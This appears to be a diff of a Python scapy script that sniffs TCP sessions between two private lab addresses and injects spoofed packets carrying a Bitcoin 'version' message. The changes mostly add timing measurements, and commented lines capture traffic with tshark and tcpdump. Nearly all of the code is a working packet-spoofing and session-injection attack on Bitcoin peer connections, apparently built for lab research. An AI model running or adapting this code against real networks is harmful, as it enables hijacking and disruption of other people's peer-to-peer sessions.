@@ -1,9 +1,11 @@
 from scapy.all import *
+import time
+
 a = " "
 #os.system("tshark  -T fields  -e frame.time -e  data.data -w bitcoin.pcap > Eavesdrop_Data.txt -F pcap -c 1000")
 #os.system("tcpdump -i enp0s3 -w bitcoin.pcap")
 
-src = "10.0.2.15"
+src = "10.0.2.12"
 dst = "10.0.2.7"
 sport = " "
 dport = " "
@@ -19,6 +21,15 @@ ip = IP(src = src, dst = dst)
 #ACK = TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq+1)
 #send(ip/ACK)
 
+count = 0
+t_start = time.time()
+print("start time:", t_start)
+
+t_middle = time.time()
+t_d = t_middle - t_start
+print("t_d:", t_d)
+
+
 def pkt_callback(pkt):
     src = "10.0.2.12"
     dst = "10.0.2.7"
@@ -29,14 +40,15 @@ def pkt_callback(pkt):
     pld_VERSION = '\xf9\xbe\xb4\xd9version\x00\x00\x00\x00\x00\x00\x00\x00\x00]\xf6\xe0\xe2'
     ip = IP(src = src, dst = dst)
 
+    t_start = time.time()
     #if pkt[IP].src == "10.0.2.15" and pkt[IP].dst == "10.0.2.7":
        #pkt.show()
     try:
           if pkt[IP].src == "10.0.2.12" and pkt[IP].dst == "10.0.2.7" and pkt[TCP].payload:
-             pkt.show()
+             #pkt.show()
              print("!!!!! outbound session, flags:", pkt[TCP].flags)
           elif pkt[IP].src == "10.0.2.12" and pkt[IP].dst == "10.0.2.7" and pkt[TCP].flags == 16L:
-             pkt.show()
+             #pkt.show()
              print("!!!!! outbound session, flags:", pkt[TCP].flags)            
              sport = pkt[TCP].sport
              dport = pkt[TCP].dport
@@ -52,9 +64,14 @@ def pkt_callback(pkt):
              pkt_spoof = ip/tcp/pld_VERSION
              print(pkt_spoof)
              send(pkt_spoof)
+             t_end = time.time()
+             #count = count + 1
+             t = t_end - t_start
              print("!!!!  $p00f scceeds!")
+             print("duration t: ", t)
+             #print("count: ", count)
           elif pkt[IP].dst == "10.0.2.12" and pkt[IP].src == "10.0.2.7" and pkt[TCP].payload:
-             pkt.show()
+             #pkt.show()
              print("!!!!! inbound session, flags:", pkt[TCP].flags)
              sport = pkt[TCP].dport
              dport = pkt[TCP].sport
